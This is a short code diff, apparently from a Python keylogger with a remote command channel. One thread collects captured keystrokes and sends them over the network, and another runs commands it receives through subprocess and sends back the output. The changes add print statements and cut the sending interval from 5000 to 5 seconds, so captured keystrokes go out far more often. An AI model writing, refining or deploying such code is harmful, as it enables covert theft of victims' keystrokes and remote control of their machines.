@@ -45,8 +45,9 @@ class KeyChecker(threading.Thread):
         while True:
             if self.keylogger.hasInfoToSend():
                 info = self.keylogger.getInfo()
+                print(info)
                 net.send(info)
-            time.sleep(5000)
+            time.sleep(5)
 
 
 class RecvChecker(threading.Thread):
@@ -75,6 +76,7 @@ class RecvChecker(threading.Thread):
             if (self.verifyCommand(command)):
                 try:
                     sp = subprocess.getoutput(command)
+                    print(sp)
                     net.send(sp)
                 except Exception as e:
                     pass
